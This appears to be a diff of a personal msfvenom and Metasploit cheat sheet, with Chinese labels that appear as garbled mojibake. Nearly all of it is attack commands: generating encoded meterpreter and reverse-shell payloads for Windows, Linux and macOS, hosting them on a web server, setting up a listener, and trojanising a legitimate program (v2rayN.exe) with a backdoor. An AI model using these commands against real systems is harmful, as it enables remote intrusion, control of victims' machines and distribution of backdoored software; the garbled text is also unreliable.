@@ -1,42 +1,47 @@
-±àÒëÒ»´Î£º
+è§£å†³rev shellä¸‹ä¸­æ–‡ä¹±ç é—®é¢˜ï¼Œcmdä¸‹è¾“å…¥
+```
+chcp 65001
+```
+
+ç¼–è¯‘ä¸€æ¬¡ï¼š
 msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.0.92  lport=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -f exe -o /var/www/html/1.exe
 
 
-±àÒëÁ½´Î£º
+ç¼–è¯‘ä¸¤æ¬¡ï¼š
 msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.0.92 lport=4444 -b "\x00" -e x86/shikata_ga_nai -i 20 | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 10 -f exe -o /var/www/html/2.exe
 
 
 
-¼àÌı£º
-ÔÚMSFÉÏÆô¶¯handler¿ªÊ¼¼àÌıºóÃÅ³ÌĞò
-1£¬use exploit/multi/handler 
-2£¬set playload windows/meterpreter/reverse_tcp
+ç›‘å¬ï¼š
+åœ¨MSFä¸Šå¯åŠ¨handlerå¼€å§‹ç›‘å¬åé—¨ç¨‹åº
+1ï¼Œuse exploit/multi/handler 
+2ï¼Œset playload windows/meterpreter/reverse_tcp
 
 
-½â¾ölinuxÁ¬½ÓwindowsµçÄÔÖĞÎÄÂÒÂëÎÊÌâ£º
-ÔÚÄ¿±êdosÉÏÊäÈë£º
+è§£å†³linuxè¿æ¥windowsç”µè„‘ä¸­æ–‡ä¹±ç é—®é¢˜ï¼š
+åœ¨ç›®æ ‡dosä¸Šè¾“å…¥ï¼š
 chcp 65001
 
 
 
-ÔÚÈí¼şÉÏ¼ÓºóÃÅ£º
+åœ¨è½¯ä»¶ä¸ŠåŠ åé—¨ï¼š
 
 msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.107 lport=4444 -b "\x00" -e x86/shikata_ga_nai -i 10 -x v2rayN.exe -f exe -o /var/www/html/v2rayN2.exe
 
 
 
-Éú³ÉlinuxÏÂµÄ¿ÉÖ´ĞĞÄ¾Âí³ÌĞò£º
+ç”Ÿæˆlinuxä¸‹çš„å¯æ‰§è¡Œæœ¨é©¬ç¨‹åºï¼š
 msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.107 lport=4444 -b "\x00"  -i 10 -f elf -o /var/www/html/demo
 
-(×¢Òâ£¬ÒòÎªÉú³ÉÊ±Ö¸¶¨µÄpayloadÊÇ£ºlinux/x64/meterpreter/reverse_tcp£¬ËùÒÔÔÚmsf¼àÌıÊ±Ò²ÒªÖ¸¶¨Õâ¸öpayload£¬·ñÔò»á±¨´í)
+(æ³¨æ„ï¼Œå› ä¸ºç”Ÿæˆæ—¶æŒ‡å®šçš„payloadæ˜¯ï¼šlinux/x64/meterpreter/reverse_tcpï¼Œæ‰€ä»¥åœ¨msfç›‘å¬æ—¶ä¹Ÿè¦æŒ‡å®šè¿™ä¸ªpayloadï¼Œå¦åˆ™ä¼šæŠ¥é”™)
 
 
-Éú³ÉmacÏÂµÄÄ¾Âí³ÌĞò
+ç”Ÿæˆmacä¸‹çš„æœ¨é©¬ç¨‹åº
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.1.107 lport=4444 -f macho > shell.macho
 
 
 
-msfvenom -l        ÁĞ³öËùÓĞÄ£¿é£¬¹¥»÷ÔØºÉ
+msfvenom -l        åˆ—å‡ºæ‰€æœ‰æ¨¡å—ï¼Œæ”»å‡»è½½è·
 
 Binaries
 
@@ -81,7 +86,7 @@ msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Co
 
 
 Shellcode
-For all shellcode see ¡®msfvenom ¨Chelp-formats¡¯ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.
+For all shellcode see â€˜msfvenom â€“help-formatsâ€™ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.
 
 Linux Based Shellcode
 
